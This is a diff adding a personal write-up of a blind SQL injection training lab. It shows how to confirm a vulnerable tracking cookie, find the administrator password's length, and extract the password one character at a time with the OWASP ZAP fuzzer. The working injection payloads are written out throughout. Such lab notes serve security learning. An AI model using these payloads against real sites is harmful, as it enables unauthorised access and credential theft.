@@ -1,0 +1,41 @@
+==> SQLi lab 11
+==> Goal: get the administrator's password to log in with using blind SQLi (so asking true and false question to database)
+
+here if the query is successful the site returns 'welcome back' message and if its false it doesn't so we use that as our blind guide
+we have told that there's a table users which contains username and password columns
+the vulnerable parameter is tracking-cookie
+if we have to idea where the sqli vulnerability is we search all the parameters to find it
+
+> first let's check the if cookie is vulnerable or not
+payload: ' and 1=1-- (true) , ' and 1=0-- (false)
+we if the welcome message shows that means its vulnerable parameter
+
+> okay so if both the conditions are true then site returns welcome back so we will ask the questions based on that
+now to check lets see if users table exist in database
+payload: ' and (select 'x' from users LIMIT 1)='x'--
+output: we get the welcome back message means theres a table named users
+
+> now we confirm that username administrator exists in users table
+payload: ' and (select username from users where username='administrator')='administrator'--
+output: okay now we get welcome back message that's a proof of administrator does exist in username
+
+> now we have to retrieve the password from the password table but we can't directly see it because site doesn't give us the o/p
+so first we will check the length of the password
+bruteforce our way
+payload: ' and (select username from users where username='administrator' and LENGTH(password)=1)='administrator'--
+add this query in fuzzer of owasp-zap fuzz through 1 to 25 (whatever number you want)
+it will send that many requests and will give you all the outputs
+here we get our welcome back message in 20 means our password length is 20 (also in the response that particular message length is greater than all
+the other responses)
+
+> okay we know that our password is 20 characters now we also have to brute force but how we will check is like this
+we will check the first character of password if it matches then we got right character if it doesnt then check other characters
+we do this for all the characters of the password from 1st to 20th
+we also have to use owasp-zap fuzzer this time too
+payload: ' and (select substring(password,1,1) from users where username='administrator')='a'--
+bruteforce the parameters 1-20(password length and positions) , character a-z and 0-9
+after using fuzz tool we get 20 pages where welcome message was printed
+so password we found is : k3x77zhy7bin8zubxv8z
+now lets check the password is correct pr not..
+okay our password is correct we have successfully solved the lab
+congrats....
